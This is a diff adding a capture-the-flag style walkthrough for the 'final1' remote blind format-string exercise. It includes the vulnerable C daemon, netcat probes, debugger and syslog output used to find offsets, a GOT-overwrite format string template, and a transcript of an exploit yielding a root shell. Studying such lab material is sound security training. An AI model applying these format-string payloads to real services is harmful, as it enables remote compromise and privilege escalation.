@@ -1938,19 +1938,226 @@ root
 
 
 ### Source Code:
+
 ```c
+#include "../common/common.c"
 
+#include <syslog.h>
+
+#define NAME "final1"
+#define UID 0
+#define GID 0
+#define PORT 2994
+
+char username[128];
+char hostname[64];
+
+void logit(char *pw)
+{
+  char buf[512];
+
+  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);
+
+  syslog(LOG_USER|LOG_DEBUG, buf);
+}
+
+void trim(char *str)
+{
+  char *q;
+
+  q = strchr(str, '\r');
+  if(q) *q = 0;
+  q = strchr(str, '\n');
+  if(q) *q = 0;
+}
+
+void parser()
+{
+  char line[128];
+
+  printf("[final1] $ ");
+
+  while(fgets(line, sizeof(line)-1, stdin)) {
+      trim(line);
+      if(strncmp(line, "username ", 9) == 0) {
+          strcpy(username, line+9);
+      } else if(strncmp(line, "login ", 6) == 0) {
+          if(username[0] == 0) {
+              printf("invalid protocol\n");
+          } else {
+              logit(line + 6);
+              printf("login failed\n");
+          }
+      }
+      printf("[final1] $ ");
+  }
+}
+
+void getipport()
+{
+  int l;
+  struct sockaddr_in sin;
+
+  l = sizeof(struct sockaddr_in);
+  if(getpeername(0, &sin, &l) == -1) {
+      err(1, "you don't exist");
+  }
+
+  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
+}
+
+int main(int argc, char **argv, char **envp)
+{
+  int fd;
+  char *username;
+
+  /* Run the process as a daemon */
+  background_process(NAME, UID, GID); 
+  
+  /* Wait for socket activity and return */
+  fd = serve_forever(PORT);
+
+  /* Set the client socket to STDIN, STDOUT, and STDERR */
+  set_io(fd);
+
+  getipport();
+  parser();
+
+}
 ```
-### Stack:
 
+### Walkthrough:
 
-### Plan:
+So this exercise is a "remote blind format string". Looking at the source, it's not apparent that there is any format string vuln.  I started by sending some input to see what the program does.  If you give the input "username x" , it sets the username var to "x". Then when you do "login x" , it calls the logit function, which does an snprintf call, and a syslog call. 
 
+before proceeding, if you are new to format string vulns , http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html is a GREAT resource and helped me alot! Please read and understand before continuing!
 
-### winning command:
+I started by throwing some input to test for format string vulns.
+
+```zsh
+➜  binaries git:(master) ✗ nc localhost 2994  ##connect to socket with netcat
+[final1] $ username %n%n%n         # give input to test for format string
+[final1] $ login %n%n%n
+```
+I simultaneously ran an ltrace on the process to see what was being called
+
+```zsh
+➜  ~ ps aux | grep final1  #find process
+l         9247  0.0  0.8  54552  8544 pts/2    S+   12:19   0:01 vim final1.py
+root     10460  0.0  0.1   2060  1184 ?        S    16:12   0:00 ./final1
+l        10467  0.0  0.0  14620   932 pts/1    S+   16:13   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn final1
+root     27488  0.0  0.1   2060  1196 ?        Ss   Jan27   0:00 ./final1
+➜  ~ sudo ltrace -p 10460
+[sudo] password for l: 
+strchr("login %n%n%n\n", '\r')                                   = nil
+strchr("login %n%n%n\n", '\n')                                   = "\n"
+strncmp("login %n%n%n", "username ", 9)                          = -1
+strncmp("login %n%n%n", "login ", 6)                             = 0
+snprintf("Login from 127.0.0.1:56412 as [%"..., 512, "Login from %s as [%s] with passw"..., "127.0.0.1:56412", "%n%n%n", "%n%n%n") = 62
+syslog(15, "Login from 127.0.0.1:56412 as [%"..., 0x8049ee4, 0x804a2a0, 0x804a220, 0xffffd6e6, 0, 0 <no return ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+➜  ~ 
+```
+
+We can see that its dying on the syslog call... So I pulled up GDB to take a closer look. I once again simultaneously fed the input from before with netcat while watching in GDB. 
 
 ```bash
+Program received signal SIGSEGV, Segmentation fault.
+0x555d4e2f in vfprintf () from /lib32/libc.so.6
+gdb$ bt
+#0  0x555d4e2f in vfprintf () from /lib32/libc.so.6
+#1  0x55671aaf in __vsyslog_chk () from /lib32/libc.so.6
+#2  0x55671b87 in syslog () from /lib32/libc.so.6
+#3  0x080498ef in logit (pw=0xffffd6e6 "%n%n%n") at final1/final1.c:19
+#4  0x080499ef in parser () at final1/final1.c:46
+#5  0x08049b04 in main (argc=0x1, argv=0xffffd834, envp=0xffffd83c) at final1/final1.c:82
+gdb$ 
 ```
+
+We can see the segfault happened in vfprintf. 
+
+Syslog calls vsyslog_chk which then calls vfprintf.
+
+So now we know where our printf vuln is. The next step is to check out the call stack at the vfprintf call by setting a breakpoint there.
+
+Syslog is also writing to /var/log/syslog, so we can use this to help us build our format string attack.
+
+we give the following input with netcat
+```bash
+[final1] $ username AAAAAA %p %p %p %p %p %p %p %p
+[final1] $ login AAAAAA %p %p %p %p %p %p %p %p
+login failed
+```
+and get the following output in our syslog
+
+```bash
+Jan 27 12:42:04 ip-172-31-61-60 final1: 
+Login from 127.0.0.1:56052 as [AAAAAA 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e] 
+with password [AAAAAA 0x31206d6f 0x302e3732 0x312e302e 0x3036353a 0x61203235 0x415b2073 0x41414141 0x70252041]
+```
+
+We can do some testing with this to calculate our offsets.  
+
+Here is our netcat input
+
+```bash
+➜  binaries git:(master) ✗ nc localhost 2994
+[final1] $ username x
+[final1] $ login AAAABBBB %p %p %p %p %p %p %p %p %p %p
+login failed
+[final1] $ login AAAABBBB %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+login failed
+[final1] $ login AAAABBBBX %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p      login failed
+[final1] $ login xAAAABBBB %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+login failed
+[final1] $ login xxxAAAABBBB%19$     
+login failed
+[final1] $ login xxxAAAABBBB%19$p
+login failed
+[final1] $ login xxxAAAABBBB%20$p
+login failed
+[final1] $ login xxxAAAABBBB%21$p
+login failed
+[final1] $ 
+```
+
+And corresponding syslog output
+
+```bash
+Feb  2 16:32:04 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [AAAABBBB 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732]
+Feb  2 16:32:43 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [AAAABBBB 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732 0x312e302e 0x3436353a 0x61203831 0x785b2073 0x6977205d 0x70206874 0x77737361 0x2064726f 0x4141415b 0x42424241]
+Feb  2 16:33:36 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [AAAABBBBX 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732 0x312e302e 0x3436353a 0x61203831 0x785b2073 0x6977205d 0x70206874 0x77737361 0x2064726f 0x4141415b 0x42424241]
+Feb  2 16:34:08 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xAAAABBBB 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732 0x312e302e 0x3436353a 0x61203831 0x785b2073 0x6977205d 0x70206874 0x77737361 0x2064726f 0x4141785b 0x42424141]
+Feb  2 16:35:34 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB%]
+Feb  2 16:35:47 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB0x7878785b]
+Feb  2 16:36:02 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB0x41414141]
+Feb  2 16:36:28 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB0x42424242]  
+```
+The goal here is to use %x$p to point to the location on the stack that we can control. As you can see in the end, we get this with 20 and 21 given our input.
+
+Now that we have this, we can switch %p to %n to write arbitrary data to a target location.
+
+For this challenge, i wanted to try something new, so I overwrote the GOT (global offset table) entry for strcpy. This is the portion of our program that points us to the strcpy function in the loaded library. 
+
+```nasm
+08048cbc <strcpy@plt>:
+ 8048cbc:	ff 25 70 a1 04 08    	jmp    *0x804a170    <---- see the jump?
+ 8048cc2:	68 f0 00 00 00       	push   $0xf0
+ 8048cc7:	e9 00 fe ff ff       	jmp    8048acc <_init+0x30>
+```
+
+As you can see this jumps to the location at 0x804a170
+We will overwrite this with a location of some shellcode. Since we're going to jump to a location on the stack, make sure ASLR is off!
+
+We need to build an input that looks like this 
+```xml
+  <address><address+2>%<x>x%<offset>$hn%<y>x%<offset+1>$hn
+```
+we need to split the address up and do 2 writes, with %hn . We have our offsets from earlier testing. The tricky part now was getting the x and y values which will determine what is written to those locations by %n by providing a "bytes written" value. The method on codearcana didnt work out for me on this challenge, so I basically threw in a number for y and saw what was written to address+2. I then calced the dif, and modified the value accordingly until i got what i needed! Theres probably a more "scientific" method to go about this, but I was ready to get this done ;)
+
+After some testing , I ended up with the following values for my system. I could then throw shellcode on the end and jump to where it sat on the stack, and was able to get a shell!
+
 ### Python exploit:
 
 ```python 
@@ -1992,6 +2199,19 @@ try:
     t.interact()
 except socket.errno:
     raise
+```
+
+### winning command:
+
+```zsh
+➜  binaries git:(master) ✗ ./final1.py 
+[*]Connecting to target
+Press Enter to send payload
+[*]Sending Payload 
+enjoy your shell
+[final1] $ [final1] $ login failed
+[final1] $ whoami
+root
 ```
 
 
